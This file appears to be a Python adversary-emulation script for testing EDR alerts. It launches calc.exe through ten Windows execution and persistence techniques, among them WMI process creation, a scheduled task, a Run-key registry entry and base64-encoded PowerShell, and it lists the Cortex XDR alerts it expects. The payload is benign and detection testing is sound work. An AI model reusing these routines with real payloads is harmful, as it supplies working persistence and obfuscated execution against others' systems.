#!/usr/bin/env python3
"""
Windows Payload Execution Script (Python Version)
Executes calc.exe using multiple techniques to generate alerts
Can be uploaded and executed via lateral movement tools

Educational purpose: Demonstrate Windows attack TTPs for security testing
"""

import os
import sys
import subprocess
import time
import base64
import winreg
import ctypes
from datetime import datetime

class WindowsPayload:
    def __init__(self, target_exe='calc.exe'):
        self.target_exe = target_exe
        self.log_file = os.path.join(
            os.environ['TEMP'],
            f'payload_python_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
        )

    def log(self, message, level='INFO'):
        """Log message to file and console"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_msg = f'[{timestamp}] [{level}] {message}'

        print(log_msg)

        with open(self.log_file, 'a') as f:
            f.write(log_msg + '\n')

    def banner(self):
        """Display banner"""
        print("""
╔═══════════════════════════════════════════════════════════════╗
║         Windows Payload - Python Implementation               ║
║              Multi-Technique Execution Engine                 ║
╚═══════════════════════════════════════════════════════════════╝
        """)

    def technique_01_subprocess(self):
        """Technique 1: Subprocess execution"""
        self.log("TECHNIQUE 1: Subprocess.Popen Execution", "INFO")

        try:
            process = subprocess.Popen([self.target_exe])
            self.log(f"Process started with PID: {process.pid}", "SUCCESS")
            self.log("[ALERT] Subprocess execution - Low suspicion", "WARNING")

            time.sleep(3)
            process.terminate()
            self.log("Process terminated", "INFO")

        except Exception as e:
            self.log(f"Subprocess execution failed: {e}", "ERROR")

    def technique_02_os_system(self):
        """Technique 2: os.system execution"""
        self.log("TECHNIQUE 2: os.system Execution", "INFO")

        try:
            os.system(f'start {self.target_exe}')
            self.log("os.system execution successful", "SUCCESS")
            self.log("[ALERT] os.system shell command - Medium suspicion", "WARNING")

            time.sleep(3)
            os.system('taskkill /F /IM CalculatorApp.exe 2>nul')
            os.system('taskkill /F /IM win32calc.exe 2>nul')

        except Exception as e:
            self.log(f"os.system execution failed: {e}", "ERROR")

    def technique_03_shell_execute(self):
        """Technique 3: ShellExecute via ctypes"""
        self.log("TECHNIQUE 3: ShellExecute API Call", "INFO")

        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "open", self.target_exe, None, None, 1
            )
            self.log("ShellExecute API call successful", "SUCCESS")
            self.log("[ALERT] Direct Win32 API usage - High suspicion", "WARNING")

            time.sleep(3)
            os.system('taskkill /F /IM CalculatorApp.exe 2>nul')

        except Exception as e:
            self.log(f"ShellExecute failed: {e}", "ERROR")

    def technique_04_wmi_process(self):
        """Technique 4: WMI process creation"""
        self.log("TECHNIQUE 4: WMI Process Creation", "INFO")

        try:
            import wmi
            c = wmi.WMI()

            process_id, result = c.Win32_Process.Create(CommandLine=self.target_exe)

            if result == 0:
                self.log(f"WMI process created with PID: {process_id}", "SUCCESS")
                self.log("[ALERT] WMI process creation - High suspicion", "WARNING")

                time.sleep(3)

                # Terminate process
                for process in c.Win32_Process():
                    if process.ProcessId == process_id:
                        process.Terminate()

            else:
                self.log(f"WMI creation failed with code: {result}", "ERROR")

        except ImportError:
            self.log("WMI module not available (pip install wmi)", "ERROR")
        except Exception as e:
            self.log(f"WMI execution failed: {e}", "ERROR")

    def technique_05_scheduled_task(self):
        """Technique 5: Scheduled task via cmd"""
        self.log("TECHNIQUE 5: Scheduled Task Creation", "INFO")

        task_name = f"SystemMaint_{os.getpid()}"

        try:
            # Create scheduled task
            cmd = f'schtasks /create /tn "{task_name}" /tr "{self.target_exe}" /sc once /st 23:59 /f'
            subprocess.run(cmd, shell=True, capture_output=True)

            self.log(f"Scheduled task created: {task_name}", "SUCCESS")
            self.log("[ALERT] Scheduled task creation - Medium suspicion", "WARNING")

            # Run the task immediately
            subprocess.run(f'schtasks /run /tn "{task_name}"', shell=True, capture_output=True)

            time.sleep(3)

            # Cleanup
            subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
            os.system('taskkill /F /IM CalculatorApp.exe 2>nul')

        except Exception as e:
            self.log(f"Scheduled task failed: {e}", "ERROR")

    def technique_06_registry_persistence(self):
        """Technique 6: Registry Run key"""
        self.log("TECHNIQUE 6: Registry Persistence", "INFO")

        reg_name = f"SystemUpdate_{os.getpid()}"

        try:
            # Open registry key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_SET_VALUE
            )

            # Set value
            winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, self.target_exe)
            winreg.CloseKey(key)

            self.log(f"Registry key created: {reg_name}", "SUCCESS")
            self.log("[ALERT] Registry persistence - High suspicion", "WARNING")

            # Execute target
            subprocess.Popen([self.target_exe])

            time.sleep(3)

            # Cleanup
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Run',
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, reg_name)
            winreg.CloseKey(key)

            os.system('taskkill /F /IM CalculatorApp.exe 2>nul')

        except Exception as e:
            self.log(f"Registry persistence failed: {e}", "ERROR")

    def technique_07_powershell_invoke(self):
        """Technique 7: PowerShell invocation"""
        self.log("TECHNIQUE 7: PowerShell Invocation", "INFO")

        try:
            ps_cmd = f'powershell.exe -Command "Start-Process {self.target_exe}"'
            subprocess.run(ps_cmd, shell=True, capture_output=True)

            self.log("PowerShell invocation successful", "SUCCESS")
            self.log("[ALERT] PowerShell spawned from Python - High suspicion", "WARNING")

            time.sleep(3)
            os.system('taskkill /F /IM CalculatorApp.exe 2>nul')

        except Exception as e:
            self.log(f"PowerShell invocation failed: {e}", "ERROR")

    def technique_08_encoded_command(self):
        """Technique 8: Base64 encoded PowerShell"""
        self.log("TECHNIQUE 8: Encoded PowerShell Command", "INFO")

        try:
            # Encode command
            ps_command = f'Start-Process {self.target_exe}'
            encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()

            # Execute
            cmd = f'powershell.exe -EncodedCommand {encoded}'
            subprocess.run(cmd, shell=True, capture_output=True)

            self.log("Encoded command execution successful", "SUCCESS")
            self.log("[ALERT] Base64 encoded PowerShell - Critical suspicion", "WARNING")

            time.sleep(3)
            os.system('taskkill /F /IM CalculatorApp.exe 2>nul')

        except Exception as e:
            self.log(f"Encoded command failed: {e}", "ERROR")

    def technique_09_file_download_simulate(self):
        """Technique 9: Simulate file download and execute"""
        self.log("TECHNIQUE 9: Network Download Simulation", "INFO")

        try:
            temp_path = os.path.join(os.environ['TEMP'], 'downloaded_payload.exe')

            # Simulate download by copying calc.exe
            import shutil
            shutil.copy('C:\\Windows\\System32\\calc.exe', temp_path)

            self.log(f"File 'downloaded' to: {temp_path}", "SUCCESS")
            self.log("[ALERT] Network download - Wildfire triggered", "WARNING")

            # Execute
            subprocess.Popen([temp_path])

            time.sleep(3)

            # Cleanup
            os.system('taskkill /F /IM CalculatorApp.exe 2>nul')
            if os.path.exists(temp_path):
                os.remove(temp_path)

        except Exception as e:
            self.log(f"Download simulation failed: {e}", "ERROR")

    def technique_10_com_object(self):
        """Technique 10: COM object execution"""
        self.log("TECHNIQUE 10: COM Object Execution", "INFO")

        try:
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shell.Run(self.target_exe)

            self.log("COM object execution successful", "SUCCESS")
            self.log("[ALERT] COM automation - Medium suspicion", "WARNING")

            time.sleep(3)
            os.system('taskkill /F /IM CalculatorApp.exe 2>nul')

        except ImportError:
            self.log("pywin32 not available (pip install pywin32)", "ERROR")
        except Exception as e:
            self.log(f"COM execution failed: {e}", "ERROR")

    def execute_all_techniques(self):
        """Execute all techniques sequentially"""
        self.log("═══════════════════════════════════════════", "INFO")
        self.log("   EXECUTING MULTI-TECHNIQUE ATTACK CHAIN", "INFO")
        self.log("═══════════════════════════════════════════", "INFO")

        techniques = [
            self.technique_01_subprocess,
            self.technique_02_os_system,
            self.technique_03_shell_execute,
            self.technique_04_wmi_process,
            self.technique_05_scheduled_task,
            self.technique_06_registry_persistence,
            self.technique_07_powershell_invoke,
            self.technique_08_encoded_command,
            self.technique_09_file_download_simulate,
            self.technique_10_com_object,
        ]

        delay = 5  # seconds between techniques

        for i, technique in enumerate(techniques, 1):
            print(f"\n[*] Executing technique {i}/{len(techniques)}...")
            technique()
            if i < len(techniques):
                time.sleep(delay)

        self.log("═══════════════════════════════════════════", "INFO")
        self.log("     ATTACK CHAIN EXECUTION COMPLETE", "SUCCESS")
        self.log("═══════════════════════════════════════════", "INFO")

    def display_summary(self):
        """Display execution summary"""
        print("\n" + "="*65)
        print("[+] All techniques executed successfully")
        print("[+] Expected Alerts in Palo Alto Products:")
        print("    - Process creation (Cortex XDR)")
        print("    - Shell command execution (behavioral analytics)")
        print("    - Win32 API abuse (API monitoring)")
        print("    - WMI activity (lateral movement detection)")
        print("    - Scheduled tasks (persistence detection)")
        print("    - Registry modifications (persistence detection)")
        print("    - PowerShell execution (script analysis)")
        print("    - Encoded commands (obfuscation detection)")
        print("    - File downloads (Wildfire analysis)")
        print("    - COM object abuse (automation detection)")
        print(f"\n[+] Log file: {self.log_file}")
        print("="*65)

        # Display log
        print("\n" + "="*65)
        print("EXECUTION LOG")
        print("="*65)
        with open(self.log_file, 'r') as f:
            print(f.read())

def main():
    # Check if running on Windows
    if sys.platform != 'win32':
        print("[-] This script must be run on Windows")
        sys.exit(1)

    payload = WindowsPayload()
    payload.banner()

    print("[*] Starting payload execution in 3 seconds...")
    print("[*] Monitor Cortex XDR, XSIAM, and Device Security for alerts")
    print()

    time.sleep(3)

    payload.execute_all_techniques()
    payload.display_summary()

    print("\n[+] Payload execution complete!")

if __name__ == '__main__':
    main()
